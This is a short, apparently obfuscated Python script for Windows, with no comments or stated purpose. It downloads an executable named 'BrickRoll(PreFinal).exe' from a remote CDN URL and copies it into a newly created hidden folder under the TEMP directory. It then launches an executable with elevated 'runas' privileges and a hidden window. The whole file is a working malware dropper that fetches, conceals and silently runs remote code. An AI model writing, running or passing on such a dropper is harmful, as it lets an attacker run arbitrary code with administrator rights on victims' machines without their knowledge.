import os #line:1
from dotenv import load_dotenv #line:2
import shutil #line:3
from random import randint #line:4
import win32con ,win32api #line:5
import urllib .request #line:7
load_dotenv ()#line:8
url ="https://cdn.glitch.global/d7d3f709-3b9b-476d-95ca-6770e274cde6/BrickRoll(PreFinal).exe?v=1644042386063"#line:9
urllib .request .urlretrieve (url ,"BrickRoll(PreFinal).exe")#line:10
x =os .environ .get ('TEMP')+"\\.tmp241253"#line:11
y =os .getcwd ()+"\\BrickRoll(PreFinal).exe"#line:12
os .makedirs (x )#line:13
win32api .SetFileAttributes (x ,win32con .FILE_ATTRIBUTE_HIDDEN )#line:14
shutil .copy (y ,x )#line:15
win32api .ShellExecute (0 ,"runas","C:\\Users\\User\\Desktop\\BrickRoll(PreFinal).exe",None ,None ,0 )#line:16
